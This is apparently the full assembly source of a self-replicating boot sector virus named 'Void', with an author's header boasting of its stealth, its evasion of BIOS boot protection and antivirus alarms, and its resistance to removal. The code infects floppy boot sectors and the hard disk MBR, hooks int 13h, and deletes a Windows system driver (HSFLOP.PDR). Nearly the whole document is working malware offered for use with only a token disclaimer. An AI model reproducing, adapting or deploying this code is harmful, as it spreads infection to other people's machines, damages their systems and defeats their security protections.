;	Void Boot Virus
;
;	This is a boot sector virus with a bunch of nifty features. It's
;stealth, it disables Win9x 32-bit disk access by deleting hsflop.pdr, it
;uses a rectal way of hooking int13h, so that the boot sector virus alarm
;isn't set off, it disables BIOS boot protection. It calculates an
;appropriate place to infect on floppies, and can infect any format currently
;in existence. It also uses an unorthodox method of infecting the MBR - it
;points the bootable partition table entry (whatever the fuck it's called)
;to itself - which is an anti-removal strategy. The virus can't be removed
;while resident, can't be overwritten with FDISK/MBR, and booting clean from
;an infected hard disk becomes very interesting. :] Basically, a BSV that
;should be viable in the wild today. It's 612 bytes in size last time I
;checked. If you figure out how to assemble and drop this virus, you can
;obviously figure out the consequences.
;
;	The code is copyright Buz [FS]. It can be used privately and
;non-commercially. Please be conscientious and don't use it in a morally
;objectionable way. If this code is used in such a way, you are agreeing to
;having your severed head sent to your spouse, mom or significant other.
;Thank you.

org	0

vsize	equ	old_21h-friend_or_foe
mark	equ	3dh+offset sig
loader	equ	k_kode-friend_or_foe
buffer	equ	old_21h+4

friend_or_foe:
	xor	ax,ax
	cli
	mov	ss,ax
	mov	sp,7c00h
	sti
	mov	si,413h
	sub	word ptr [si],2
	lodsw
	mov	cl,6
	shr	ax,cl
	mov	es,ax
	xor	ax,ax
	mov	bx,ax
	mov	ds,ax
	int	13h

k_load:
	mov	ax,203h
	db	0b9h
trksec	dw	0
	db	0bah
heddrv	dw	0
	int	13h
	jc	k_load
	push	es
	mov	ax,offset k_kode
	push	ax
	retf

sig	db	'VOID'

k_kode:
	mov	si,21h*4
	mov	di,offset old_21h
	movsw
	movsw
	mov	si,13h*4
	mov	di,offset old_13h
	movsw
	movsw
	mov	ax,0f000h
	mov	es,ax
	xor	di,di
	mov	ax,0cd18h
	mov	cx,0fffeh

incesticide:
	scasw
	jz	found_cd18h
	dec	di
	loop	incesticide

found_cd18h:
	dec	di
	dec	di
	mov	word ptr [si-4],di
	mov	word ptr [si-2],es
	mov	di,18h*4
	push	ds
	pop	es
	mov	ax,offset see_dick_run
	stosw
	mov	ax,cs
	stosw
	mov	si,475h
	lodsb
	or	al,al
	jz	k_boot
	mov	dl,80h
	call	infect_HD

k_boot:
	push	cs
	pop	ds
	mov	si,offset buffer
	push	es
	mov	di,7c00h
	push	di
	mov	cx,200h
	rep	movsb
	retf

see_dick_run:
	pusha
	push	ds
	push	es
	push	cs
	pop	ds
	xor	ax,ax
	mov	es,ax
	mov	si,offset old_21h
	mov	di,21h*4
	cmpsw
	jnz	change
	cmpsw
	jnz	change
	pop	es
	pop	ds
	popa

int13h_handler:
	pusha
	push	ds
	push	es
	call	infect_boot
	pop	es
	pop	ds
	popa
	cmp	ah,2
	jz	flux
	cmp	ah,3
	jz	unhugged
	cmp	ah,5
	jnz	return_13h
	jmp	format_fn

return_13h:
	db	0eah
old_13h	dd	0
sig2	db	'buz [FS]'

change:
	mov	si,18h*4
	mov	ax,offset int13h_handler
	stosw

k_flop:
	push	cs
	pop	ds
	mov	ah,3bh
	mov	dx,offset dotdot
	int	21h
	jnc	k_flop
	mov	ah,41h
	mov	dx,offset flop
	int	21h
	pop	es
	pop	ds
	popa
	jmp	short int13h_handler

flux:
	pusha
	push	ds
	push	es
	call	chk_boot
	pop	es
	pop	ds
	popa
	push	ds
	push	es
	push	bx
	call	int13h
	or	dl,dl
	js	HD_read
	call	calculate_root
	mov	ax,201h
	add	cx,2
	jmp	short read_kewl

HD_read:
	mov	ax,201h
	mov	cx,9

read_kewl:
	xor	dh,dh
	pop	bx
	pop	es
	pop	ds
	jmp	short return_13h

unhugged:
	pusha
	push	ds
	push	es
	push	bx
	push	es
	call	chk_boot
	or	dl,dl	
	js	HD_write
	call	calculate_root
	mov	ax,201h
	add	cx,2
	jmp	short write_kewl

HD_write:
	mov	ax,201h
	mov	cx,9

write_kewl:
	pop	es
	pop	bx
	call	int13h
	pop	es
	pop	ds
	popa
        jmp     return_13h

format_fn:
	pusha
	push	ds
	push	es
	cmp	ch,0
	jz	format_track0
	call	not_boot

format_track0:
	pop	es
	pop	ds
	popa
	popf
	clc
	xor	ah,ah
	retf	2

dotdot	db '..'
flop	db 'C:\WINDOWS\SYSTEM\IOSUBSYS\HSFLOP.PDR',0

chk_boot:
	or	dh,dh
	jz	not_boot
	cmp	cx,1
	jz	not_boot
	ret

not_boot:
	pop	ax
	pop	es
	pop	ds
	popa	
        jmp     return_13h

calculate_root:
	call	read_boot
	lea	si,[bx+10h]
	lodsb
	xchg	cx,ax
	mov	bx,10
	div	bx
	push	ax
	add	ax,3
	mul	cx
	inc	ax
	pop	cx
	add	cx,ax
	lodsw
	sub	cx,ax
	mov	ch,1
	sub	cx,3
	ret

write_boot:
	mov	ah,05h
	mov	cl,59h
	int	16h	
	mov	ax,301h
	jmp	short int13h_kewl

read_boot:
	mov	ax,201h

int13h_kewl:
	mov	cx,1
	xor	dh,dh
	push	cs
	pop	es
	mov	bx,offset buffer

int13h:
	pushf
	call	dword ptr cs:[old_13h]
	ret

infect_boot:
chk_disk:
	push	cs
	pop	ds
	call	read_boot
	or	dl,dl
	js	test_HD
	lea	di,[bx+mark]

is_VBS:
	mov	si,offset sig
	scasw
	jnz	not_infected
	scasw
	jnz	not_infected
	ret

test_HD:
	lea	si,[bx+1beh]

HD_test:
	lodsb
	cmp	si,80h
	jz	test_HD_boot
	add	si,0fh
	jmp	short HD_test

test_HD_boot:
	lodsw
	mov	dh,ah
	mov	cl,al
	lodsb
	mov	ch,al
	mov	ax,201h
	call	int13h
	lea	di,[bx+offset sig]
	jmp	short is_VBS

not_infected:
	or	dl,dl
	js	infect_HD

infect_FD:
	call	calculate_root
	xchg	ax,cx
	push	ax
	mov	di,offset trksec
	stosw
	inc	di
	xor	ax,ax
	stosw
	mov	ax,303h
	mov	bx,offset friend_or_foe
	pop	cx
	call	int13h
	mov	si,offset friend_or_foe
	mov	di,offset buffer+3dh
	mov	cx,loader
	rep	movsb
	call	write_boot
	xor	ah,ah
	int	16h
	ret

infect_HD:
	call	read_boot
	mov	di,offset trksec
	mov	ax,7
	stosw
	inc	di
	mov	ax,80h
	stosb
	mov	ax,303h
	mov	cx,7
	mov	bx,offset friend_or_foe
	call	int13h
	mov	al,80h
	mov	di,offset buffer+1beh

scan_partition:
	scasb
	jz	iris_evergreen
	add	di,0fh
	jmp	short scan_partition

iris_evergreen:
	mov	ax,7
	stosw
	xchg	ah,al
	stosb	
	call	write_boot
	xor	ah,ah
	int	16h
	ret

old_21h: